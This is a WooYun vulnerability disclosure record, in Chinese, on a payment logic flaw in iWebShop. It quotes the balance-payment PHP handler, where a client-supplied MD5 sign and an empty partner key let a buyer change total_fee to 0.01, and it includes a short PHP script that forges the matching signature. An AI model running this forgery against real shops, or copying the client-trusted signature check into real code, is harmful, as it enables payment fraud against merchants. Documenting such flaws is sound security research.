{"id": 38408, "wybug_id": "wooyun-2015-096384", "wybug_title": "Iwebshop 最新版支付漏洞（1分钱任意买）", "wybug_corp": "iWebShop", "wybug_author": "路人甲", "wybug_date": "2015-02-16 13:21", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-16：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebshop 最新版支付漏洞（1分钱任意买） 详细说明：  看到iwebshop在2015.01.26又更新了（v3.0.15011000），看了看更新说明，说已经修改了wooyun上的漏洞，就下下来研究一下。问题点：POST /index.php?controller=ucenter&action=payment_balance  用户在支付自己的订单时（预存款 支付），抓包修改价格，但是有一个数据校验，下面看看是如何突破检验的。文件在/controllers/ucenter.php的payment_balance()方法中\nfunction payment_balance()    {    \t$urlStr  = '';    \t$user_id = intval($this->user['user_id']);\t\t    \t$return['attach']     = IReq::get('attach');     \t$return['total_fee']  = IReq::get('total_fee');    \t    \t$return['order_no']   = IReq::get('order_no');    \t$return['return_url'] = IReq::get('return_url');    \t$sign                 = IReq::get('sign');    \tif(stripos($return['order_no'],'recharge_') !== false)    \t{    \t\tIError::show(403,'余额支付方式不能用于在线充值');    \t\texit;    \t}    \tif(floatval($return['total_fee']) <= 0 || $return['order_no'] == '' || $return['return_url'] == '')    \t{    \t\tIError::show(403,'支付参数不正确');    \t}    \telse    \t{    \t\t$paymentDB  = new IModel('payment');    \t\t$paymentRow = $paymentDB->getObj('class_name = \"balance\" ');    \t\t$pkey       = Payment::getConfigParam($paymentRow['id'],'M_PartnerKey');    \t\t\t    \t\techo gettype($pkey);    \t \t    \t//md5校验\t    \tksort($return);\t\t\tforeach($return as $key => $val)\t\t\t{\t\t\t\t\t\t$urlStr .= $key.'='.urlencode($val).'&';\t\t\t}\t\t\t$urlStr .= $user_id.$pkey;\t\t\t\tif($sign != md5($urlStr))         //********问题点在这里！！！*******\t\t\t{\t\t\t\tIError::show(403,'数据校验不正确');\t\t\t}\t\t\telse\t\t\t{\t\t    \t$memberObj = new IModel('member');\t\t    \t$memberRow = $memberObj->getObj('user_id = '.$user_id);\t\t    \tif(empty($memberRow))\t\t    \t{\t\t    \t\tIError::show(403,'用户信息不存在');\t\t    \t\texit;\t\t    \t}\t\t    \telse if($memberRow['balance'] < $return['total_fee'])\t\t    \t{\t\t    \t\tIError::show(403,'账户余额不足');\t\t    \t\texit;\t\t    \t}\t\t    \telse\t\t    \t{\t\t    \t\t$orderObj = new IModel('order');\t\t    \t\t$orderRow = $orderObj->getObj('order_no  = \"'.IFilter::act($return['order_no']).'\" and pay_status = 0 and user_id = '.$user_id);\t\t    \t\tif(empty($orderRow))\t\t    \t\t{\t\t    \t\t\tIError::show(403,'订单已经被处理过，请查看订单状态');\t\t    \t\t\texit;\t\t    \t\t}\t\t\t\t\t$dataArray  = array('balance' => 'balance - '.IFilter::act($return['total_fee']));\t\t\t\t\t$memberObj->setData($dataArray);\t\t\t    \t$is_success = $memberObj->update('user_id = '.$user_id,'balance');\t\t\t    \tif($is_success)\t\t\t    \t{\t\t\t    \t\t$return['is_success'] = 'T';\t\t\t    \t}\t\t\t    \telse\t\t\t    \t{\t\t\t    \t\t$return['is_success'] = 'F';\t\t\t    \t}\t\t\t    \tksort($return);\t\t\t    \t//返还的URL地址\t\t\t\t\t$responseUrl = '';\t\t\t\t\tforeach($return as $key => $val)\t\t\t\t\t{\t\t\t\t\t\t$responseUrl .= $key.'='.urlencode($val).'&';\t\t\t\t\t}\t\t\t\t\t$nextUrl = urldecode($return['return_url']);\t\t\t\t\tif(stripos($nextUrl,'?') === false)\t\t\t\t\t{\t\t\t\t\t\t$return_url = $nextUrl.'?'.$responseUrl;\t\t\t\t\t}\t\t\t\t\telse\t\t\t\t\t{\t\t\t\t\t\t$return_url = $nextUrl.'&'.$responseUrl;\t\t\t\t\t}\t\t\t\t\t//计算要发送的md5校验\t\t\t\t\t$urlStrMD5  = md5($responseUrl.$user_id.$pkey);\t\t\t\t\t//拼接进返还的URL中\t\t\t\t\t$return_url.= 'sign='.$urlStrMD5;\t\t\t    \theader('location:'.$return_url);\t\t    \t}\t\t\t}    \t}    }}\n用来做数据校验的$sign由客户端发到服务器，因此，这里我们可以修改，校验字段的生成方法如下\n<?php\t$urlStr  = '';\t$pkey = '';\t$user_id= 1;\t$return['attach']     = \"1\";\t$return['total_fee']  = '0.01';\t$return['order_no']   = '20150207214421724325';\t$return['return_url'] = urldecode(\"http%3A%2F%2F192.168.0.107%2Findex.php%3Fcontroller%3Dblock%26action%3Dcallback%26_id%3D1\");\tksort($return);\tforeach($return as $key => $val)\t\t{\t\t\t\t\t$urlStr .= $key.'='.urlencode($val).'&';\t\t}\t$urlStr .= $user_id.$pkey;\t\techo md5($urlStr);?>\n当$sign= md5($urlStr)时，即可绕过校验，由上面的代码可知，只要知道$pkey、$user_id以及自己的输入（通过抓包可获得），就可以得到 md5($urlStr)了。$pkey一直是空，$user_id在post的包中可以获得（具体见下图）\n\n下图为初始用户信息\n\n下图为支付完成后的图，只用了1分钱就完成了支付\n\n   漏洞证明：  见详细说明   修复方案：  用户属性验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}